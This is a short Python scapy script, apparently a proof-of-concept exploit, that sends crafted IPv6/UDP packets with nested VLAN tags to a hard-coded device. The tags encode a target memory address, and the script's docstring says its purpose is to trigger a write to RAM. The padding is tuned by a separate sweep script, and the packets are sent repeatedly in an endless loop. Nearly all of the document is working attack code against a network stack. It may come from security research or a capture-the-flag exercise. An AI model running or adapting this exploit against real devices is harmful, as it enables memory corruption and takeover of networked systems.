''' Sends packets to trigger a write to RAM
'''
from scapy.all import *

# Hard-coded in `hardcoded_mac_address`
mac = "0e:1d:9a:64:b8:c2"
ip = "fe80::c1d:9aff:fe64:b8c2"

consecutive_failures = 0
pad = 46 # found using sweep.py

target_addr = 0x30010000
def u16_to_dot1q(v):
    vlan = v & 0xFFF
    dei = (v >> 12) & 1
    prio = (v >> 13) & 0b111
    return Dot1Q(vlan=vlan, id=dei, prio=prio)

outer = u16_to_dot1q(target_addr & 0xFFFF)
inner = u16_to_dot1q((target_addr >> 16) & 0xFFFF)

while True:
    base = Ether(dst=mac) / IPv6(dst=ip) / UDP(dport=7777, sport=2000)
    start = base / "1 hello, world"

    outer = Dot1Q(vlan=0x301, prio=0)
    poison = Ether(dst=mac) / outer / inner / IPv6(dst=ip) / UDP(dport=7777, sport=2000)
    packets = []
    for i in range(1, 6):
        data = f"data-{i}" + '0' * pad
        packets.append(poison / data)

    sendp(start) # slow packet
    time.sleep(0.05)
    sendp(packets)
    time.sleep(0.25)
